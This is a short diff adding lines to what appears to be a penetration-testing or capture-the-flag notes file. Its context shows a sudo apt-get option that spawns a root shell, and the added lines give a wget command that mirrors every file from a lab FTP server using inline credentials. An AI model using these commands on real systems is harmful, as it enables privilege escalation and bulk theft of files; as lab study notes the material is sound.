@@ -566,3 +566,9 @@ When the shell exits the update command is actually executed.
 
 sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 
+<br />
+<br />
+
+wget -m ftp://user:password@10.10.135.250 
+
+downloads all files from FTP
